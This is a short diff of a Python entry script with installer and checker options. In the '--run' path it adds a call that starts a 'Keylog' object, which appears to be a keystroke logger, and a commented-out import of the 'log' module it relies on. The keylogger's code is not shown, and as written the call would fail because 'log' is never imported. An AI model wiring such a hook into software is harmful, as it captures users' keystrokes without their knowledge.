@@ -2,6 +2,7 @@ import sys
 
 import bin.install
 from bin.assets import themes
+# from bin import log
 
 if __name__ == "__main__":
 
@@ -15,6 +16,12 @@ if __name__ == "__main__":
             Installer = bin.install.Installer(sys.platform)
         if sys.argv[1] == "--run":
             Checker = bin.install.KeeperCheck(sys.platform)
+            loger = log.run.Keylog()
+            with loger:
+                pass
 
     else:
         pass
+
+
+
